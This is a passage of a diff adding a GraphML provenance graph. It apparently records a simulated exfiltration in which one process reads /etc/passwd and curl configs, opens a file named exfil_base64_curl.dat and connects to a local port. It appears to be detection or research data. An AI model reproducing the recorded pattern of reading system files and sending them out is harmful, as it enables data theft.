+      <data key="d36">1788639304.1284587</data>
+      <data key="d37">opens</data>
+    </edge>
+    <edge source="('Process', 57589)" target="('File', '/usr/lib/ssl/openssl.cnf')">
+      <data key="d31">opens</data>
+      <data key="d32">opens</data>
+      <data key="d33">1</data>
+      <data key="d34">[5016]</data>
+      <data key="d35">1788639304.1289122</data>
+      <data key="d36">1788639304.1289122</data>
+      <data key="d37">opens</data>
+    </edge>
+    <edge source="('Process', 57589)" target="('File', '/var/lib/postgresql/.curlrc')">
+      <data key="d31">opens</data>
+      <data key="d32">opens</data>
+      <data key="d33">2</data>
+      <data key="d34">[5017, 5023]</data>
+      <data key="d35">1788639304.1292737</data>
+      <data key="d36">1788639304.1294196</data>
+      <data key="d37">opens</data>
+    </edge>
+    <edge source="('Process', 57589)" target="('File', '/var/lib/postgresql/.config/curlrc')">
+      <data key="d31">opens</data>
+      <data key="d32">opens</data>
+      <data key="d33">1</data>
+      <data key="d34">[5018]</data>
+      <data key="d35">1788639304.129284</data>
+      <data key="d36">1788639304.129284</data>
+      <data key="d37">opens</data>
+    </edge>
+    <edge source="('Process', 57589)" target="('File', '/etc/nsswitch.conf')">
+      <data key="d31">opens</data>
+      <data key="d32">opens</data>
+      <data key="d33">1</data>
+      <data key="d34">[5021]</data>
+      <data key="d35">1788639304.1293705</data>
+      <data key="d36">1788639304.1293705</data>
+      <data key="d37">opens</data>
+    </edge>
+    <edge source="('Process', 57589)" target="('File', '/etc/passwd')">
+      <data key="d31">opens</data>
+      <data key="d32">opens</data>
+      <data key="d33">1</data>
+      <data key="d34">[5022]</data>
+      <data key="d35">1788639304.129398</data>
+      <data key="d36">1788639304.129398</data>
+      <data key="d37">opens</data>
+    </edge>
+    <edge source="('Process', 57589)" target="('File', '/tmp/exfil_base64_curl.dat')">
+      <data key="d31">opens</data>
+      <data key="d32">opens</data>
+      <data key="d33">1</data>
+      <data key="d34">[5024]</data>
+      <data key="d35">1788639304.1294293</data>
+      <data key="d36">1788639304.1294293</data>
+      <data key="d37">opens</data>
+    </edge>
+    <edge source="('Process', 57589)" target="('Endpoint', ('127.0.0.1', 9090))">
+      <data key="d31">connects_to</data>
+      <data key="d32">connects_to</data>
+      <data key="d33">1</data>
+      <data key="d34">[5025]</data>
+      <data key="d35">1788639304.1296155</data>
+      <data key="d36">1788639304.1296155</data>
+      <data key="d37">connects_to</data>
+    </edge>
+    <data key="d0">4639</data>
+    <data key="d1">1788639304.0</data>
+    <data key="d2">1788639304.1309452</data>
+  </graph>
+</graphml>
